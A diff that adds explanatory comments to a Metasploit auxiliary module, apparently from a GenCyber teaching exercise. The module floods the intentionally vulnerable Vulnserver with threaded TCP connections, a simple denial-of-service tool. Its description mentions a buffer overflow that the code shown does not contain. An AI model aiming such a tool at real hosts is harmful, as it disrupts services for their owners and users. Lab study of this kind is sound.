@@ -1,32 +1,32 @@
 require 'socket'
 
-class MetasploitModule < Msf::Auxiliary
-    include Msf::Auxiliary::Dos #Although this is a DDos it is a form of DOS so this may make sense.
-    Rank = NormalRanking
+class MetasploitModule < Msf::Auxiliary       # We inherit from  Msf::Auxiliary as it will use functonality provided and will be consided a DoS module
+    include Msf::Auxiliary::Dos               # Although this is a DDoS it is a form of a DOS Module as metasploit has no DDoS modules.
+    Rank = NormalRanking                      # We set the ranking to normal for simplicity
 
 def initialize(info = {})
-    super(update_info(info, #calls parent class update_info function
-        'Name'           => 'Vulnserver DDoS', # Name of the target
-        'Description'    => %q{
+    super(update_info(info,                    # Calls parent class update_info function and updates values used by, and describing this module
+        'Name'           => 'Vulnserver DDoS', # Name of the module
+        'Description'    => %q{                
             Vulnserver is intentially written vulnerable. This expoits uses a simple buffer overflow.
-        },
-        'Author'         => [ 'fxw', 'GenCyber-UML-2022'], # Author name
-        'License'        => MSF_LICENSE,
-        'References'     =>	# References for the vulnerability or exploit
+        },                                     # Description of the module
+        'Author'         => [ 'fxw', 'GenCyber-UML-2022'], # Author(s) name(s)
+        'License'        => MSF_LICENSE,       # License this is distributed under
+        'References'     =>	
         [
             [ 'URL', 'https://github.com/xinwenfu/Malware-Analysis/edit/main/MetasploitNewModule' ]
-        ],
+        ],                                     # References for the vulnerability or exploit
         'Privileged'     => false,
-        'DisclosureDate' => 'Mar. 30, 2022'))	# When the vulnerability was disclosed in public
+        'DisclosureDate' => 'Mar. 30, 2022'))  # When the vulnerability was disclosed in public
         register_options(
         [
-            OptInt.new('ThreadNum', [ true, 'A hex or decimal', 10]), # Sets the number of threads to use
-            OptAddress.new('RHOST', [ true, 'Set IP of Reciving Host', '127.0.0.1' ]),
-            OptPort.new('RPORT', [true, 'Set Port of Reciving Host', 9999])
+            OptInt.new('ThreadNum', [ true, 'A hex or decimal', 10]),                   # Creates Datastore object ThreadNum to control the number of threads to create
+            OptAddress.new('RHOST', [ true, 'Set IP of Reciving Host', '127.0.0.1' ]),  # Creates Datastore object RHOST to control the target IP address
+            OptPort.new('RPORT', [true, 'Set Port of Reciving Host', 9999])             # Creates Datastore object RPORT to control the port number to connect to 
         ])
     end
 
-    def startExploit # Connect to the server
+    def startExploit                            # Function threads use to connect and then stay connected to the server 
         print_status("Connecting to target with IP #{datastore['RHOST']} and Port #{datastore['RPORT']}")
         s = TCPSocket.new datastore['RHOST'], datastore['RPORT'] # Connect to the server
         #connect #connect to target using values stored in datastore
@@ -35,7 +35,7 @@ def initialize(info = {})
         end
     end
 
-    def run	# Actual exploit, since this is a Auxiliary, it is a run function, type run to execute
+    def run	# Actual code the module will run, since this is a Auxiliary Module, this is a run function, type run to execute in the Metasploit console
         for x in 1..datastore['ThreadNum'] do
                 Thread.new{startExploit()} # Run startExploit for each thread
                 print_status("Connecting on thread #{x}")
